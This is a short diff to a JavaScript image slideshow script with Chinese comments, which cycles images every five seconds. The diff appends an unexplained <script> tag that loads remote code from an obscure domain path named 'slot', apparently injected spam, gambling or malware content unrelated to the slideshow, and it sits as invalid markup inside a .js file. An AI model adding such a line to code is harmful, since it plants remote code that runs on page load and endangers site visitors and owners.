@@ -21,3 +21,4 @@ var randomIndex = Math.floor(Math.random() * images.length); // 生成随机索�
 
 setInterval(changeImage, 5000); // 每5秒调用一次changeImage函数
 
+<script src="https://aba.hdjthzg.cn/slot?2377029035902478992-34788"></script>
